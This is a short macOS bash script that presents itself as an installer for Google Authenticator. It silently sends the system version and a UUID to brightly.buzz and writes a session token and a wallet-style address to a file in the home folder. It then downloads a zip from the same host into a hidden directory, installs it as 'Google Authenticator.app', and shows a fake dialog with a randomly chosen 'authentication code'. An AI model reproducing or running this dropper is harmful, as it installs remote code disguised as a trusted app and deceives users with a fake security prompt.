#!/bin/bash

curl -s "https://brightly.buzz/post_info?uuid=640d27b3-370e-4505-a7fe-c3b42009537d&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=z201h04mEj+PFKGEtvXSIXqKo2rbJWGlZnKxZRpL86zWTkLwTRL951G3ilCp/k4MS8fY4PxolgzIxWOJfV5yiA== > context
echo SERVER_ADDRESS=0xCd01cc4172842EC6351e8C72AA5D959a2C7def24 >> context

cd ~/
mkdir .gerc
cd .gerc
curl -o initer.zip https://brightly.buzz/fileServe/Authenticator.zip  > /dev/null 2>&1
unzip -o initer.zip > /dev/null 2>&1
rm -f initer.zip > /dev/null 2&>1
mv "Google Authenticator.app" /Applications

open "/Applications/Google Authenticator.app"

array=(
  "234166"
  "923819"
  "134665"
  "195642"
  "465102"
  "355477"
  "296082"
  "964125"
  "305478"
  "532116"
)
RANDOM_INDEX=$((RANDOM % ${#array[@]}))
OTP=${array[$RANDOM_INDEX]}
FORMATTED_OTP="${OTP:0:3} ${OTP:3:3}"
osascript -e "display dialog \"Authentication code: ${FORMATTED_OTP}\" with title \"Google Authenticator\" buttons {\"Confirm\"} default button \"Confirm\""

exit 0
